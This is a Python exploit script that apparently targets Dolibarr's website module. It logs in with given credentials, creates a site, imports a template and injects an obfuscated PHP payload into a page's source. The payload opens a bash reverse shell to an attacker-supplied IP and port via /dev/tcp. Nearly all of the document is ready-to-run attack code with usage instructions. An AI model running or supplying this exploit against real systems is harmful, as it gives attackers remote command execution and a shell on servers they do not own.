#!/usr/bin/python3

from bs4 import BeautifulSoup
import requests
import re
import sys
import urllib.parse
import time

global pageid

def login(session, url, username, password):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }

    response = session.get(url, headers=headers)
    token_pattern = re.compile(r'name="token"\s+value="([^"]+)"')
    token_match = token_pattern.search(response.text)
    if not token_match:
        print("[!] Can't find token. Login failed.")
        return False

    token = token_match.group(1)

    login_data = {
        'token': token,
        'actionlogin': 'login',
        'loginfunction': 'loginfunction',
        'username': username,
        'password': password
    }

    response = session.post(url, headers=headers, data=login_data)

    if "logout.php" in response.text:
        print("[*] Login successfully!")
        return True
    else:
        print("[!] Login failed!.")
        return False

def create_new_website(session, base_url, website_name, website_ref):
    create_site_url = f"{base_url}/website/index.php?action=createsite"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }
    response = session.get(create_site_url, headers=headers)

    token_pattern = re.compile(r'name="token"\s+value="([^"]+)"')
    token_match = token_pattern.search(response.text)
    if not token_match:
        print("[!] Can't find token. Create website failed!")
        return False

    token = token_match.group(1)

    create_url = f"{base_url}/website/index.php"
    headers['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundarySGdUy7IrELO1QjS7'
    headers['Origin'] = base_url
    headers['Referer'] = create_site_url

    data = (
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="token"\r\n\r\n{token}\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="action"\r\n\r\naddsite\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="website"\r\n\r\n{website_name}\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="WEBSITE_REF"\r\n\r\n{website_ref}\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="WEBSITE_LANG"\r\n\r\nen\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7\r\n'
        f'Content-Disposition: form-data; name="addcontainer"\r\n\r\nCreate\r\n'
        f'------WebKitFormBoundarySGdUy7IrELO1QjS7--\r\n'
    )

    response = session.post(create_url, headers=headers, data=data)

    check_url = f"{base_url}/website/index.php?website={urllib.parse.quote(website_ref)}"
    response = session.get(check_url, headers=headers)

    if website_ref in response.text:
        print(f"[*] Website '{website_name}' was created successfully!")
        return True
    else:
        print(f"[!] Create website '{website_name}' failed!")
        return False

def import_website_template(session, base_url, website_ref, template_name):
    import_url = f"{base_url}/website/index.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
        'Origin': base_url,
        'Referer': f"{base_url}/website/index.php?website={website_ref}",
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarycOj11DfKZTAmAuwx'
    }

    response = session.get(f"{base_url}/website/index.php?website={website_ref}", headers=headers)
    token_pattern = re.compile(r'name="token"\s+value="([^"]+)"')
    token_match = token_pattern.search(response.text)
    if not token_match:
        print("[!] Can't find token. Import template failed!")
        return False

    token = token_match.group(1)

    data = (
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx\r\n'
        f'Content-Disposition: form-data; name="token"\r\n\r\n{token}\r\n'
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx\r\n'
        f'Content-Disposition: form-data; name="website"\r\n\r\n{website_ref}\r\n'
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx\r\n'
        f'Content-Disposition: form-data; name="importsite"\r\n\r\nImport website template\r\n'
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx\r\n'
        f'Content-Disposition: form-data; name="pageidbis"\r\n\r\n-1\r\n'
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx\r\n'
        f'Content-Disposition: form-data; name="pageid"\r\n\r\n0\r\n'
        f'------WebKitFormBoundarycOj11DfKZTAmAuwx--\r\n'
    )

    response = session.post(import_url, headers=headers, data=data)

    confirm_url = f"{base_url}/website/index.php?action=importsiteconfirm&token={token}&website={website_ref}&templateuserfile={template_name}"
    response = session.get(confirm_url, headers=headers)

    time.sleep(5)  # Wait a little bit for input successfully

    check_url = f"{base_url}/website/index.php?website={website_ref}"
    response = session.get(check_url, headers=headers)
    global pageid
    # Create Object BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find tag select with id is 'pageid'
    select_tag = soup.find('select', id='pageid')

    # Find option was choosed (attributed is 'selected')
    selected_option = select_tag.find('option', selected=True)

    # Gets the value of the 'value' attribute of the selected option
    pageid = selected_option['value']

    if response.status_code == 200:
        print(f"[*] Template '{template_name}' was imported successfully for website '{website_ref}'!")
        return True
    else:
        print(f"[!] Import template '{template_name}' for website '{website_ref}' failed!")
        return False

#ch∆∞a check
def editHTMLSource(session, base_url, website_ref, pageid, payload, token):
    edit_url = f"{base_url}/website/index.php?website={website_ref}&pageid={pageid}&action=editsource&token={token}"
    update_url = f"{base_url}/website/index.php"

    print(f"[*] URL use to insert: {edit_url}")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': edit_url,
        'Connection': 'close',
        'Origin': base_url,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryoATPtXnPKTGmWzmf'
    }
    
    data = (
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="token"\r\n\r\n{token}\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="backtopage"\r\n\r\n\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="dol_openinpopup"\r\n\r\n\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="action"\r\n\r\nupdatesource\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="website"\r\n\r\n{website_ref}\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="pageid"\r\n\r\n{pageid}\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="update"\r\n\r\nSave\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="PAGE_CONTENT_x"\r\n\r\n2\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="PAGE_CONTENT_y"\r\n\r\n8\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf\r\n'
        f'Content-Disposition: form-data; name="PAGE_CONTENT"\r\n\r\n{payload}\r\n'
        f'------WebKitFormBoundaryoATPtXnPKTGmWzmf--\r\n'
    )
    
    response = session.post(update_url, headers=headers, data=data)
    
    # print header after POST request
    print("[*] Headers after POST request to update HTML source:")
    print(response.headers)
    
    check_url = f"{base_url}/website/index.php?website={website_ref}&pageid={pageid}"
    response = session.get(check_url, headers=headers)
    
    if response.status_code == 200:
        print(f"[*] HTML source of page {pageid} successfully updated!")
        return True
    else:
        print(f"[!] Failed to update HTML source of page {pageid}.")
        return False

def main():
    if len(sys.argv) != 6:
        print("Usage: python3 exploit.py <URL> <USERNAME> <PASSWORD> <IP_ADDRESS> <PORT>")
        print("Example: python3 exploit.py http://192.168.0.110 admin 15112003 192.168.0.102 4444")
        sys.exit(1)

    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    listener_ip = sys.argv[4]
    listener_port = sys.argv[5]

    website_name = "Reverse5"
    website_ref = "Reverse5"
    template_name = "website_template-stellar.zip"

    if not base_url.endswith('/'):
        base_url += '/'

    session = requests.Session()

    login_url = f"{base_url}index.php?mainmenu=home"
    if login(session, login_url, username, password):
        if create_new_website(session, base_url, website_name, website_ref):
            if import_website_template(session, base_url, website_ref, template_name):
                payload = '''<?php
                    $_ = "{";
                    $_ = ($_^"<").($_^">;").($_^"/");
                    ${'_'.$_} = array("_" => 'exec', "__" => '/bin/bash -c "/bin/bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"');
                    $func_name = ${'_'.$_}["_"];
                    $param = ${'_'.$_}["__"];
                    $output = call_user_func($func_name, $param);
                    echo $output;
                    ?>'''
                payload = payload.replace('{listener_ip}', listener_ip).replace('{listener_port}', listener_port)
                # Extract token for editHTMLSource
                edit_url = f"{base_url}/website/index.php?website={website_ref}&pageid={pageid}&action=editsource"
                response = session.get(edit_url)
                token_pattern = re.compile(r'name="token"\s+value="([^"]+)"')
                token_match = token_pattern.search(response.text)
                if not token_match:
                    print("[!] Token not found. Editing HTML failed.")
                    return False
                
                token = token_match.group(1)
                if editHTMLSource(session, base_url, website_ref, pageid, payload, token):
                    # Add delay to allow changes to take effect
                    time.sleep(5)
                    # Refresh the page by making a GET request to the same page URL
                    refresh_url = f"{base_url}/website/index.php?website={website_ref}&pageid={pageid}"
                    # No cache
                    print ("[*] Look listener machine")
                    response = session.get(refresh_url, headers={"Cache-Control": "no-cache"})
                    response = session.get(refresh_url)
    else:
        print("[!] Cannot proceed with further steps due to failed login.")

if __name__ == "__main__":
    main()
